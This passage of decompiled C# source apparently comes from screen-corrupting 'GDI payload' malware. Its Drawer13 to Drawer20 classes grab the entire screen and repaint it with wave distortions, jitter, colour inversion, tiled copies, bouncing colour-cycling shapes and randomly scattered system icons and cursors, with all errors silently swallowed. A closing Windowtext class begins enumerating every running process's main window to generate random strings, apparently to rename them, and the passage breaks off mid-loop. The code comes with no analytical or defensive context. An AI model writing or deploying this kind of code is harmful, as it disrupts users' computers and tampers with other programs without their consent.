          Thread.Sleep(this.random.Next(10));
        }
        catch
        {
        }
      }
    }

    private class Drawer13 : Program.er1.Drawer
    {
      private int redrawCounter;
      private int redrawCounter2;
      private static Random r = new Random();
      private int cc;
      private static int ballWidth = 500;
      private static int ballHeight = 500;
      private static int ballPosX = Program.er1.Drawer13.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
      private static int ballPosY = Program.er1.Drawer13.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
      private static int moveStepX = 50;
      private static int moveStepY = 50;

      public override void Draw(IntPtr hdc)
      {
        try
        {
          IntPtr compatibleDc = Program.er1.CreateCompatibleDC(hdc);
          IntPtr compatibleBitmap = Program.er1.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
          Program.er1.SelectObject(compatibleDc, compatibleBitmap);
          Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
          Graphics graphics = Graphics.FromHdc(compatibleDc);
          double num1 = (double) (Screen.PrimaryScreen.Bounds.Width / 1000);
          double num2 = (double) (Screen.PrimaryScreen.Bounds.Height / 1000);
          float num3 = 0.0f;
          float num4 = 0.0f;
          float num5 = 50f;
          for (float a = 0.0f; (double) a < num1; a += 1f / 1000f)
          {
            double num6 = Math.Sin((double) a);
            ++this.redrawCounter;
            int redrawCounter = this.redrawCounter;
            int nYDest = (int) Math.Round((double) num3 * (double) num5 + (double) num4);
            Program.er1.BitBlt(compatibleDc, redrawCounter, nYDest, 1, this.screenH, compatibleDc, redrawCounter, 0, 13369376);
            Program.er1.BitBlt(compatibleDc, redrawCounter, this.screenH + nYDest, 1, this.screenH, compatibleDc, redrawCounter, 0, 13369376);
            Program.er1.BitBlt(compatibleDc, redrawCounter, -this.screenH + nYDest, 1, this.screenH, compatibleDc, redrawCounter, 0, 13369376);
            if (this.redrawCounter >= this.screenW)
              this.redrawCounter = 0;
            num3 = (float) num6;
          }
          for (float a = 0.0f; (double) a < num2; a += 1f / 1000f)
          {
            double num7 = Math.Sin((double) a);
            ++this.redrawCounter2;
            int redrawCounter2 = this.redrawCounter2;
            int nXDest = (int) Math.Round((double) num3 * (double) num5 + (double) num4);
            Program.er1.BitBlt(compatibleDc, nXDest, redrawCounter2, this.screenW, 1, compatibleDc, 0, redrawCounter2, 13369376);
            Program.er1.BitBlt(compatibleDc, this.screenW + nXDest, redrawCounter2, this.screenW, 1, compatibleDc, 0, redrawCounter2, 13369376);
            Program.er1.BitBlt(compatibleDc, -this.screenW + nXDest, redrawCounter2, this.screenW, 1, compatibleDc, 0, redrawCounter2, 13369376);
            if (this.redrawCounter2 >= this.screenH)
              this.redrawCounter2 = 0;
            num3 = (float) num7;
          }
          Program.er1.Drawer13.ballPosX += Program.er1.Drawer13.moveStepX;
          if (Program.er1.Drawer13.ballPosX < 0 || Program.er1.Drawer13.ballPosX + Program.er1.Drawer13.ballWidth > this.screenW)
            Program.er1.Drawer13.moveStepX = -Program.er1.Drawer13.moveStepX;
          Program.er1.Drawer13.ballPosY += Program.er1.Drawer13.moveStepY;
          if (Program.er1.Drawer13.ballPosY < 0 || Program.er1.Drawer13.ballPosY + Program.er1.Drawer13.ballHeight > this.screenH)
            Program.er1.Drawer13.moveStepY = -Program.er1.Drawer13.moveStepY;
          this.cc += 10;
          Program.er1.RGB rgb = Program.er1.HSLToRGB(new Program.er1.HSL(this.cc % 360, 1f, 0.5f));
          Brush brush = (Brush) new SolidBrush(Color.FromArgb((int) rgb.R, (int) rgb.G, (int) rgb.B));
          Pen pen = new Pen(Color.Red);
          graphics.FillEllipse(brush, Program.er1.Drawer13.ballPosX, Program.er1.Drawer13.ballPosY, Program.er1.Drawer13.ballWidth, Program.er1.Drawer13.ballHeight);
          Program.er1.BitBlt(hdc, 0, 0, this.screenW, this.screenH, compatibleDc, 0, 0, 4457256);
          Program.er1.DeleteObject(compatibleDc);
          Program.er1.DeleteObject(compatibleBitmap);
          Thread.Sleep(this.random.Next(10));
        }
        catch
        {
        }
      }
    }

    private class Drawer14 : Program.er1.Drawer
    {
      private int cc;

      public override void Draw(IntPtr hdc)
      {
        try
        {
          IntPtr compatibleDc = Program.er1.CreateCompatibleDC(hdc);
          IntPtr compatibleBitmap = Program.er1.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
          Program.er1.SelectObject(compatibleDc, compatibleBitmap);
          Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
          Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, hdc, this.random.Next(-10, 10), this.random.Next(-10, 10), 6684742);
          this.cc += 10;
          Program.er1.RGB rgb = Program.er1.HSLToRGB(new Program.er1.HSL(this.cc % 360, 1f, 0.5f));
          IntPtr solidBrush = Program.er1.CreateSolidBrush((uint) ColorTranslator.ToWin32(Color.FromArgb((int) rgb.R, (int) rgb.G, (int) rgb.B)));
          Program.er1.SelectObject(compatibleDc, solidBrush);
          Program.er1.PatBlt(compatibleDc, 0, 0, this.screenW, this.screenH, CopyPixelOperation.PatInvert);
          Program.er1.AlphaBlend(hdc, 0, 0, this.screenW, this.screenH, compatibleDc, 0, 0, this.screenW, this.screenH, new Program.er1._BLENDFUNCTION()
          {
            BlendOp = (byte) 0,
            BlendFlags = (byte) 0,
            SourceConstantAlpha = (byte) 16 /*0x10*/,
            AlphaFormat = (byte) 0
          });
          Program.er1.DeleteObject(compatibleDc);
          Program.er1.DeleteObject(compatibleBitmap);
          Thread.Sleep(this.random.Next(10));
        }
        catch
        {
        }
      }
    }

    private class Drawer15 : Program.er1.Drawer
    {
      private int redrawCounter;
      private int redrawCounter2;
      private static Random r = new Random();
      private int cc;
      private static int ballWidth = 0;
      private static int ballHeight = 0;
      private static int ballPosX = Program.er1.Drawer15.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
      private static int ballPosY = Program.er1.Drawer15.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
      private static int moveStepX = Program.er1.Drawer15.r.Next(1, 17);
      private static int moveStepY = Program.er1.Drawer15.r.Next(1, 17);
      private static int ballWidth1 = 0;
      private static int ballHeight1 = 0;
      private static int ballPosX1 = Program.er1.Drawer15.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
      private static int ballPosY1 = Program.er1.Drawer15.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
      private static int moveStepX1 = Program.er1.Drawer15.r.Next(1, 17);
      private static int moveStepY1 = Program.er1.Drawer15.r.Next(1, 17);
      private static int ballWidth2 = 0;
      private static int ballHeight2 = 0;
      private static int ballPosX2 = Program.er1.Drawer15.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
      private static int ballPosY2 = Program.er1.Drawer15.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
      private static int moveStepX2 = Program.er1.Drawer15.r.Next(1, 17);
      private static int moveStepY2 = Program.er1.Drawer15.r.Next(1, 17);

      public override void Draw(IntPtr hdc)
      {
        try
        {
          IntPtr compatibleDc = Program.er1.CreateCompatibleDC(hdc);
          IntPtr compatibleBitmap = Program.er1.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
          Program.er1.SelectObject(compatibleDc, compatibleBitmap);
          Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
          Program.er1.StretchBlt(compatibleDc, 0, 0, this.screenW / 2, this.screenH / 2, compatibleDc, 0, 0, this.screenW, this.screenH, Program.er1.TernaryRasterOperations.SRCCOPY);
          Program.er1.StretchBlt(compatibleDc, this.screenW / 2, 0, this.screenW / 2, this.screenH / 2, compatibleDc, 0, 0, this.screenW, this.screenH, Program.er1.TernaryRasterOperations.SRCCOPY);
          Program.er1.StretchBlt(compatibleDc, 0, this.screenH / 2, this.screenW / 2, this.screenH / 2, compatibleDc, 0, 0, this.screenW, this.screenH, Program.er1.TernaryRasterOperations.SRCCOPY);
          Program.er1.StretchBlt(compatibleDc, this.screenW / 2, this.screenH / 2, this.screenW / 2, this.screenH / 2, compatibleDc, 0, 0, this.screenW, this.screenH, Program.er1.TernaryRasterOperations.SRCCOPY);
          Graphics graphics = Graphics.FromHdc(compatibleDc);
          Program.er1.Drawer15.ballPosX += Program.er1.Drawer15.moveStepX;
          if (Program.er1.Drawer15.ballPosX < 0 || Program.er1.Drawer15.ballPosX + Program.er1.Drawer15.ballWidth > this.screenW)
            Program.er1.Drawer15.moveStepX = -Program.er1.Drawer15.moveStepX;
          Program.er1.Drawer15.ballPosY += Program.er1.Drawer15.moveStepY;
          if (Program.er1.Drawer15.ballPosY < 0 || Program.er1.Drawer15.ballPosY + Program.er1.Drawer15.ballHeight > this.screenH)
            Program.er1.Drawer15.moveStepY = -Program.er1.Drawer15.moveStepY;
          Program.er1.Drawer15.ballPosX1 += Program.er1.Drawer15.moveStepX1;
          if (Program.er1.Drawer15.ballPosX1 < 0 || Program.er1.Drawer15.ballPosX1 + Program.er1.Drawer15.ballWidth1 > this.screenW)
            Program.er1.Drawer15.moveStepX1 = -Program.er1.Drawer15.moveStepX1;
          Program.er1.Drawer15.ballPosY1 += Program.er1.Drawer15.moveStepY1;
          if (Program.er1.Drawer15.ballPosY1 < 0 || Program.er1.Drawer15.ballPosY1 + Program.er1.Drawer15.ballHeight1 > this.screenH)
            Program.er1.Drawer15.moveStepY1 = -Program.er1.Drawer15.moveStepY1;
          Program.er1.Drawer15.ballPosX2 += Program.er1.Drawer15.moveStepX2;
          if (Program.er1.Drawer15.ballPosX2 < 0 || Program.er1.Drawer15.ballPosX2 + Program.er1.Drawer15.ballWidth2 > this.screenW)
            Program.er1.Drawer15.moveStepX2 = -Program.er1.Drawer15.moveStepX2;
          Program.er1.Drawer15.ballPosY2 += Program.er1.Drawer15.moveStepY2;
          if (Program.er1.Drawer15.ballPosY2 < 0 || Program.er1.Drawer15.ballPosY2 + Program.er1.Drawer15.ballHeight2 > this.screenH)
            Program.er1.Drawer15.moveStepY2 = -Program.er1.Drawer15.moveStepY2;
          this.cc += 10;
          Program.er1.RGB rgb = Program.er1.HSLToRGB(new Program.er1.HSL(this.cc % 360, 1f, 0.5f));
          Brush brush = (Brush) new SolidBrush(Color.FromArgb((int) rgb.R, (int) rgb.G, (int) rgb.B));
          Pen pen = new Pen(Color.Red);
          PointF[] points = new PointF[3]
          {
            new PointF((float) Program.er1.Drawer15.ballPosX, (float) Program.er1.Drawer15.ballPosY),
            new PointF((float) Program.er1.Drawer15.ballPosX1, (float) Program.er1.Drawer15.ballPosY1),
            new PointF((float) Program.er1.Drawer15.ballPosX2, (float) Program.er1.Drawer15.ballPosY2)
          };
          graphics.FillPolygon(brush, points);
          Program.er1.BitBlt(hdc, 0, 0, this.screenW, this.screenH, compatibleDc, 0, 0, 13369376);
          Program.er1.DeleteObject(compatibleDc);
          Program.er1.DeleteObject(compatibleBitmap);
          Thread.Sleep(this.random.Next(10));
        }
        catch
        {
        }
      }
    }

    private class Drawer16 : Program.er1.Drawer
    {
      private int redrawCounter;
      private int redrawCounter2;
      private static Random r = new Random();
      private int cc;
      private static int ballWidth = 0;
      private static int ballHeight = 0;
      private static int ballPosX = Program.er1.Drawer16.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
      private static int ballPosY = Program.er1.Drawer16.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
      private static int moveStepX = Program.er1.Drawer16.r.Next(1, 17);
      private static int moveStepY = Program.er1.Drawer16.r.Next(1, 17);
      private static int ballWidth1 = 0;
      private static int ballHeight1 = 0;
      private static int ballPosX1 = Program.er1.Drawer16.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
      private static int ballPosY1 = Program.er1.Drawer16.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
      private static int moveStepX1 = Program.er1.Drawer16.r.Next(1, 17);
      private static int moveStepY1 = Program.er1.Drawer16.r.Next(1, 17);
      private static int ballWidth2 = 0;
      private static int ballHeight2 = 0;
      private static int ballPosX2 = Program.er1.Drawer16.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
      private static int ballPosY2 = Program.er1.Drawer16.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
      private static int moveStepX2 = Program.er1.Drawer16.r.Next(1, 17);
      private static int moveStepY2 = Program.er1.Drawer16.r.Next(1, 17);

      public override void Draw(IntPtr hdc)
      {
        try
        {
          IntPtr compatibleDc = Program.er1.CreateCompatibleDC(hdc);
          IntPtr compatibleBitmap = Program.er1.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
          Program.er1.SelectObject(compatibleDc, compatibleBitmap);
          Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
          for (int index = 0; index < this.screenW; ++index)
            Program.er1.BitBlt(compatibleDc, 0, index, this.screenW, 1, compatibleDc, this.random.Next(-5, 6), index, 13369376);
          Graphics graphics = Graphics.FromHdc(compatibleDc);
          Program.er1.Drawer16.ballPosX += Program.er1.Drawer16.moveStepX;
          if (Program.er1.Drawer16.ballPosX < 0 || Program.er1.Drawer16.ballPosX + Program.er1.Drawer16.ballWidth > this.screenW)
            Program.er1.Drawer16.moveStepX = -Program.er1.Drawer16.moveStepX;
          Program.er1.Drawer16.ballPosY += Program.er1.Drawer16.moveStepY;
          if (Program.er1.Drawer16.ballPosY < 0 || Program.er1.Drawer16.ballPosY + Program.er1.Drawer16.ballHeight > this.screenH)
            Program.er1.Drawer16.moveStepY = -Program.er1.Drawer16.moveStepY;
          Program.er1.Drawer16.ballPosX1 += Program.er1.Drawer16.moveStepX1;
          if (Program.er1.Drawer16.ballPosX1 < 0 || Program.er1.Drawer16.ballPosX1 + Program.er1.Drawer16.ballWidth1 > this.screenW)
            Program.er1.Drawer16.moveStepX1 = -Program.er1.Drawer16.moveStepX1;
          Program.er1.Drawer16.ballPosY1 += Program.er1.Drawer16.moveStepY1;
          if (Program.er1.Drawer16.ballPosY1 < 0 || Program.er1.Drawer16.ballPosY1 + Program.er1.Drawer16.ballHeight1 > this.screenH)
            Program.er1.Drawer16.moveStepY1 = -Program.er1.Drawer16.moveStepY1;
          Program.er1.Drawer16.ballPosX2 += Program.er1.Drawer16.moveStepX2;
          if (Program.er1.Drawer16.ballPosX2 < 0 || Program.er1.Drawer16.ballPosX2 + Program.er1.Drawer16.ballWidth2 > this.screenW)
            Program.er1.Drawer16.moveStepX2 = -Program.er1.Drawer16.moveStepX2;
          Program.er1.Drawer16.ballPosY2 += Program.er1.Drawer16.moveStepY2;
          if (Program.er1.Drawer16.ballPosY2 < 0 || Program.er1.Drawer16.ballPosY2 + Program.er1.Drawer16.ballHeight2 > this.screenH)
            Program.er1.Drawer16.moveStepY2 = -Program.er1.Drawer16.moveStepY2;
          this.cc += 10;
          Program.er1.RGB rgb = Program.er1.HSLToRGB(new Program.er1.HSL(this.cc % 360, 1f, 0.5f));
          Brush brush = (Brush) new SolidBrush(Color.FromArgb((int) rgb.R, (int) rgb.G, (int) rgb.B));
          Pen pen = new Pen(Color.Red);
          PointF[] points = new PointF[3]
          {
            new PointF((float) Program.er1.Drawer16.ballPosX, (float) Program.er1.Drawer16.ballPosY),
            new PointF((float) Program.er1.Drawer16.ballPosX1, (float) Program.er1.Drawer16.ballPosY1),
            new PointF((float) Program.er1.Drawer16.ballPosX2, (float) Program.er1.Drawer16.ballPosY2)
          };
          graphics.FillPolygon(brush, points);
          Program.er1.BitBlt(hdc, 0, 0, this.screenW, this.screenH, compatibleDc, 0, 0, 13369376);
          Program.er1.DeleteObject(compatibleDc);
          Program.er1.DeleteObject(compatibleBitmap);
          Thread.Sleep(this.random.Next(10));
        }
        catch
        {
        }
      }
    }

    private class Drawer17 : Program.er1.Drawer
    {
      private int cc;
      private Icon app = Program.er1.Extract("user32.dll", 5, true);
      private Icon warn_ico = Program.er1.Extract("user32.dll", 1, true);
      private Icon no_ico = Program.er1.Extract("user32.dll", 3, true);

      public override void Draw(IntPtr hdc)
      {
        try
        {
          IntPtr compatibleDc = Program.er1.CreateCompatibleDC(hdc);
          IntPtr compatibleBitmap = Program.er1.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
          Program.er1.SelectObject(compatibleDc, compatibleBitmap);
          Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
          for (int index = 0; index < 100; ++index)
          {
            int nXDest = this.random.Next(-this.screenW, this.screenW + this.screenW);
            int nYDest = this.random.Next(-this.screenH, this.screenH + this.screenH);
            int nWidth = this.random.Next(-this.screenW, this.screenW + this.screenW);
            int nHeight = this.random.Next(-this.screenH, this.screenH + this.screenH);
            Program.er1.BitBlt(compatibleDc, nXDest, nYDest, nWidth, nHeight, compatibleDc, nXDest + this.random.Next(-10, 11), nYDest + this.random.Next(-10, 11), 13369376);
          }
          Graphics g = Graphics.FromHdc(compatibleDc);
          for (int index = 0; index < this.screenH; index += 2)
          {
            ++this.cc;
            Program.er1.RGB rgb = Program.er1.HSLToRGB(new Program.er1.HSL(this.cc % 360, 1f, 0.5f));
            Pen pen = new Pen(Color.FromArgb(128 /*0x80*/, (int) rgb.R, (int) rgb.G, (int) rgb.B), 1f);
            g.DrawLine(pen, 0, index, this.screenW, index);
          }
          foreach (PropertyInfo property in typeof (Cursors).GetProperties(BindingFlags.Static | BindingFlags.Public))
          {
            Point location = new Point(this.random.Next(this.screenW), this.random.Next(this.screenH));
            Cursor cursor = (Cursor) property.GetValue((object) null, (object[]) null);
            cursor.Draw(g, new Rectangle(location, cursor.Size));
          }
          Bitmap bitmap1 = this.app.ToBitmap();
          Bitmap bitmap2 = this.warn_ico.ToBitmap();
          Bitmap bitmap3 = this.no_ico.ToBitmap();
          g.DrawImage((Image) bitmap1, this.random.Next(this.screenW), this.random.Next(this.screenH), this.random.Next(200), this.random.Next(200));
          g.DrawImage((Image) bitmap2, this.random.Next(this.screenW), this.random.Next(this.screenH), this.random.Next(200), this.random.Next(200));
          g.DrawImage((Image) bitmap3, this.random.Next(this.screenW), this.random.Next(this.screenH), this.random.Next(200), this.random.Next(200));
          Program.er1.AlphaBlend(hdc, 0, 0, this.screenW, this.screenH, compatibleDc, 0, 0, this.screenW, this.screenH, new Program.er1._BLENDFUNCTION()
          {
            BlendOp = (byte) 0,
            BlendFlags = (byte) 0,
            SourceConstantAlpha = (byte) this.random.Next((int) byte.MaxValue),
            AlphaFormat = (byte) 0
          });
          Program.er1.DeleteObject(compatibleDc);
          Program.er1.DeleteObject(compatibleBitmap);
          g.Dispose();
        }
        catch
        {
        }
      }
    }

    private class Drawer18 : Program.er1.Drawer
    {
      private int redrawCounter;

      public override void Draw(IntPtr hdc)
      {
        try
        {
          IntPtr compatibleDc = Program.er1.CreateCompatibleDC(hdc);
          IntPtr compatibleBitmap = Program.er1.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
          Program.er1.SelectObject(compatibleDc, compatibleBitmap);
          Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
          for (int index = 0; index < 500; ++index)
          {
            int nXDest = this.random.Next(-this.screenW, this.screenW + this.screenW);
            int nYDest = this.random.Next(-this.screenH, this.screenH + this.screenH);
            int nWidth = this.random.Next(-this.screenW, this.screenW + this.screenW);
            int nHeight = this.random.Next(-this.screenH, this.screenH + this.screenH);
            Program.er1.BitBlt(compatibleDc, nXDest, nYDest, nWidth, nHeight, compatibleDc, nXDest + this.random.Next(-1, 2), nYDest + this.random.Next(-1, 2), 13369376);
          }
          Program.er1.AlphaBlend(hdc, 0, 0, this.screenW, this.screenH, compatibleDc, 0, 0, this.screenW, this.screenH, new Program.er1._BLENDFUNCTION()
          {
            BlendOp = (byte) 0,
            BlendFlags = (byte) 0,
            SourceConstantAlpha = (byte) 127 /*0x7F*/,
            AlphaFormat = (byte) 0
          });
          Program.er1.DeleteObject(compatibleDc);
          Program.er1.DeleteObject(compatibleBitmap);
          Thread.Sleep(this.random.Next(10));
        }
        catch
        {
        }
      }
    }

    private class Drawer19 : Program.er1.Drawer
    {
      private int redrawCounter;
      private int redrawCounter2;
      private static Random r = new Random();
      private int cc;
      private static int ballWidth = 0;
      private static int ballHeight = 0;
      private static int ballPosX = Program.er1.Drawer19.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
      private static int ballPosY = Program.er1.Drawer19.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
      private static int moveStepX = Program.er1.Drawer19.r.Next(1, 17);
      private static int moveStepY = Program.er1.Drawer19.r.Next(1, 17);
      private static int ballWidth1 = 0;
      private static int ballHeight1 = 0;
      private static int ballPosX1 = Program.er1.Drawer19.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
      private static int ballPosY1 = Program.er1.Drawer19.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
      private static int moveStepX1 = Program.er1.Drawer19.r.Next(1, 17);
      private static int moveStepY1 = Program.er1.Drawer19.r.Next(1, 17);
      private static int ballWidth2 = 0;
      private static int ballHeight2 = 0;
      private static int ballPosX2 = Program.er1.Drawer19.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
      private static int ballPosY2 = Program.er1.Drawer19.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
      private static int moveStepX2 = Program.er1.Drawer19.r.Next(1, 17);
      private static int moveStepY2 = Program.er1.Drawer19.r.Next(1, 17);
      private static int ballWidth3 = 0;
      private static int ballHeight3 = 0;
      private static int ballPosX3 = Program.er1.Drawer19.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
      private static int ballPosY3 = Program.er1.Drawer19.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
      private static int moveStepX3 = Program.er1.Drawer19.r.Next(1, 17);
      private static int moveStepY3 = Program.er1.Drawer19.r.Next(1, 17);

      public override void Draw(IntPtr hdc)
      {
        try
        {
          IntPtr compatibleDc = Program.er1.CreateCompatibleDC(hdc);
          IntPtr compatibleBitmap = Program.er1.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
          Program.er1.SelectObject(compatibleDc, compatibleBitmap);
          Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
          for (int index = 0; index < this.screenW; ++index)
            Program.er1.BitBlt(compatibleDc, 0, index, this.screenW, 1, compatibleDc, this.random.Next(-5, 6), index, 13369376);
          Graphics graphics = Graphics.FromHdc(compatibleDc);
          Program.er1.Drawer19.ballPosX += Program.er1.Drawer19.moveStepX;
          if (Program.er1.Drawer19.ballPosX < 0 || Program.er1.Drawer19.ballPosX + Program.er1.Drawer19.ballWidth > this.screenW)
            Program.er1.Drawer19.moveStepX = -Program.er1.Drawer19.moveStepX;
          Program.er1.Drawer19.ballPosY += Program.er1.Drawer19.moveStepY;
          if (Program.er1.Drawer19.ballPosY < 0 || Program.er1.Drawer19.ballPosY + Program.er1.Drawer19.ballHeight > this.screenH)
            Program.er1.Drawer19.moveStepY = -Program.er1.Drawer19.moveStepY;
          Program.er1.Drawer19.ballPosX1 += Program.er1.Drawer19.moveStepX1;
          if (Program.er1.Drawer19.ballPosX1 < 0 || Program.er1.Drawer19.ballPosX1 + Program.er1.Drawer19.ballWidth1 > this.screenW)
            Program.er1.Drawer19.moveStepX1 = -Program.er1.Drawer19.moveStepX1;
          Program.er1.Drawer19.ballPosY1 += Program.er1.Drawer19.moveStepY1;
          if (Program.er1.Drawer19.ballPosY1 < 0 || Program.er1.Drawer19.ballPosY1 + Program.er1.Drawer19.ballHeight1 > this.screenH)
            Program.er1.Drawer19.moveStepY1 = -Program.er1.Drawer19.moveStepY1;
          Program.er1.Drawer19.ballPosX2 += Program.er1.Drawer19.moveStepX2;
          if (Program.er1.Drawer19.ballPosX2 < 0 || Program.er1.Drawer19.ballPosX2 + Program.er1.Drawer19.ballWidth2 > this.screenW)
            Program.er1.Drawer19.moveStepX2 = -Program.er1.Drawer19.moveStepX2;
          Program.er1.Drawer19.ballPosY2 += Program.er1.Drawer19.moveStepY2;
          if (Program.er1.Drawer19.ballPosY2 < 0 || Program.er1.Drawer19.ballPosY2 + Program.er1.Drawer19.ballHeight2 > this.screenH)
            Program.er1.Drawer19.moveStepY2 = -Program.er1.Drawer19.moveStepY2;
          Program.er1.Drawer19.ballPosX3 += Program.er1.Drawer19.moveStepX3;
          if (Program.er1.Drawer19.ballPosX3 < 0 || Program.er1.Drawer19.ballPosX3 + Program.er1.Drawer19.ballWidth3 > this.screenW)
            Program.er1.Drawer19.moveStepX3 = -Program.er1.Drawer19.moveStepX3;
          Program.er1.Drawer19.ballPosY3 += Program.er1.Drawer19.moveStepY3;
          if (Program.er1.Drawer19.ballPosY3 < 0 || Program.er1.Drawer19.ballPosY3 + Program.er1.Drawer19.ballHeight3 > this.screenH)
            Program.er1.Drawer19.moveStepY3 = -Program.er1.Drawer19.moveStepY3;
          this.cc += 10;
          Program.er1.RGB rgb = Program.er1.HSLToRGB(new Program.er1.HSL(this.cc % 360, 1f, 0.5f));
          Pen pen1 = new Pen(Color.FromArgb((int) rgb.R, (int) rgb.G, (int) rgb.B), 32f);
          pen1.StartCap = pen1.EndCap = LineCap.Round;
          Point point1 = new Point(Program.er1.Drawer19.ballPosX, Program.er1.Drawer19.ballPosY);
          Point point2 = new Point(Program.er1.Drawer19.ballPosX1, Program.er1.Drawer19.ballPosY1);
          Point point3 = new Point(Program.er1.Drawer19.ballPosX2, Program.er1.Drawer19.ballPosY2);
          Point point4 = new Point(Program.er1.Drawer19.ballPosX3, Program.er1.Drawer19.ballPosY3);
          Pen pen2 = pen1;
          Point pt1 = point1;
          Point pt2 = point2;
          Point pt3 = point3;
          Point pt4 = point4;
          graphics.DrawBezier(pen2, pt1, pt2, pt3, pt4);
          Program.er1.BitBlt(hdc, 0, 0, this.screenW, this.screenH, compatibleDc, 0, 0, 13369376);
          Program.er1.DeleteObject(compatibleDc);
          Program.er1.DeleteObject(compatibleBitmap);
          Thread.Sleep(this.random.Next(10));
        }
        catch
        {
        }
      }
    }

    private class Drawer20 : Program.er1.Drawer
    {
      private int redrawCounter2;
      private int redrawCounter;
      private static Random r = new Random();
      private int cc;
      private static int ballWidth = 200;
      private static int ballHeight = 200;
      private static int ballPosX = Program.er1.Drawer20.r.Next(Screen.PrimaryScreen.Bounds.Width - 200);
      private static int ballPosY = Program.er1.Drawer20.r.Next(Screen.PrimaryScreen.Bounds.Height - 200);
      private static int moveStepX = 10;
      private static int moveStepY = 10;

      public override void Draw(IntPtr hdc)
      {
        try
        {
          IntPtr compatibleDc = Program.er1.CreateCompatibleDC(hdc);
          IntPtr compatibleBitmap = Program.er1.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
          Program.er1.SelectObject(compatibleDc, compatibleBitmap);
          Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
          Graphics graphics = Graphics.FromHdc(compatibleDc);
          float num1 = 0.0f;
          float num2 = 0.0f;
          float num3 = 100f;
          for (float a = 0.0f; (double) a < (double) (Screen.PrimaryScreen.Bounds.Height / 10); a += 0.1f)
          {
            double num4 = Math.Sin((double) a);
            ++this.redrawCounter2;
            int redrawCounter2 = this.redrawCounter2;
            int nXDest = (int) Math.Round((double) num1 * (double) num3 + (double) num2);
            Program.er1.BitBlt(compatibleDc, nXDest, redrawCounter2, this.screenW, 1, compatibleDc, 0, redrawCounter2, 13369376);
            Program.er1.BitBlt(compatibleDc, this.screenW + nXDest, redrawCounter2, this.screenW, 1, compatibleDc, 0, redrawCounter2, 13369376);
            Program.er1.BitBlt(compatibleDc, -this.screenW + nXDest, redrawCounter2, this.screenW, 1, compatibleDc, 0, redrawCounter2, 13369376);
            if (this.redrawCounter2 >= this.screenH)
              this.redrawCounter2 = 0;
            num1 = (float) num4;
          }
          Program.er1.Drawer20.ballPosX += Program.er1.Drawer20.moveStepX;
          if (Program.er1.Drawer20.ballPosX < 0 || Program.er1.Drawer20.ballPosX + Program.er1.Drawer20.ballWidth > this.screenW)
            Program.er1.Drawer20.moveStepX = -Program.er1.Drawer20.moveStepX;
          Program.er1.Drawer20.ballPosY += Program.er1.Drawer20.moveStepY;
          if (Program.er1.Drawer20.ballPosY < 0 || Program.er1.Drawer20.ballPosY + Program.er1.Drawer20.ballHeight > this.screenH)
            Program.er1.Drawer20.moveStepY = -Program.er1.Drawer20.moveStepY;
          this.cc += 10;
          Program.er1.RGB rgb = Program.er1.HSLToRGB(new Program.er1.HSL(this.cc % 360, 1f, 0.5f));
          Brush brush = (Brush) new SolidBrush(Color.FromArgb((int) rgb.R, (int) rgb.G, (int) rgb.B));
          Pen pen = new Pen(Color.Red);
          graphics.FillEllipse(brush, Program.er1.Drawer20.ballPosX, Program.er1.Drawer20.ballPosY, Program.er1.Drawer20.ballWidth, Program.er1.Drawer20.ballHeight);
          for (int index = 0; index < 100; index += 10)
            graphics.DrawEllipse(pen, Program.er1.Drawer20.ballPosX - index / 2, Program.er1.Drawer20.ballPosY - index / 2, Program.er1.Drawer20.ballWidth + index, Program.er1.Drawer20.ballHeight + index);
          Program.er1.BitBlt(hdc, 0, 0, this.screenW, this.screenH, compatibleDc, 0, 0, 13369376);
          Program.er1.DeleteObject(compatibleDc);
          Program.er1.DeleteObject(compatibleBitmap);
          Thread.Sleep(this.random.Next(10));
        }
        catch
        {
        }
      }
    }

    private class Windowtext : Program.er1.Drawer
    {
      public override void Draw(IntPtr hdc)
      {
        try
        {
          Process process1 = new Process();
          foreach (Process process2 in Process.GetProcesses())
          {
            IntPtr mainWindowHandle = process2.MainWindowHandle;
            if (mainWindowHandle != IntPtr.Zero)
            {
              Random random = new Random();
              int num = random.Next(4, 10);
              string text = "";
              for (int index = 0; index < num; ++index)
              {
